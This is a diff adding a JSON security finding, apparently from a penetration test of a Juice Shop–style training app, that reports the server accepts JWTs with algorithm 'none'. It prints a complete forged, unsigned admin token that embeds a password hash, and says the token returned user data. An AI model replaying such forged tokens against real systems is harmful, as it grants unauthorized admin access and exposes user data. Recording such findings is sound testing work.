@@ -1,0 +1,6 @@
+{
+  "fact_key": "jwt_none_algorithm",
+  "summary": "JWT algorithm confusion - 'none' algorithm accepted",
+  "body": "The JWT verification accepts tokens with \"alg\": \"none\". When sending a forged JWT with algorithm \"none\" and no signature, the server authenticated the request as admin. Proved by accessing /api/Users/1 with the forged token resulting in 200 and user data.\nToken: eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJub25lIn0.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTAwIiwicm9sZSI6ImFkbWluIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6ImFzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdEFkbWluLnBuZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNy0yMyAyMDowNzowNS45MDAgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNy0yMyAyMDowNzowNS45MDAgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjoxLCJpYXQiOjE3ODQ4MzczNjZ9.\nResponse: 200 OK with user data.",
+  "updated_at": "2026-07-23T20:12:13.852Z"
+}
